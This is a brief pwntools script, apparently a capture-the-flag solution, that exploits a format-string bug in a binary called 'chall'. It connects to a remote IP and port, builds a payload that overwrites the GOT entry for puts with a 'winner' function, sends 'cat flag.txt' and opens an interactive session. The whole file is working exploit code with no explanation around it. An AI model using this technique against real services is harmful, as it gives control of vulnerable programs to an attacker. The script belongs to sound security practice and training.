from pwn import *

exe = context.binary = ELF("./chall")
r = process()
r = remote("194.31.53.241",20000)
offset = 7
rop = ROP(exe)
payload = fmtstr_payload(offset, {exe.got['puts']: exe.sym['winner']})
print(len(payload))
write("p",payload)
r.sendline(payload)
r.sendline("cat flag.txt")
r.interactive()
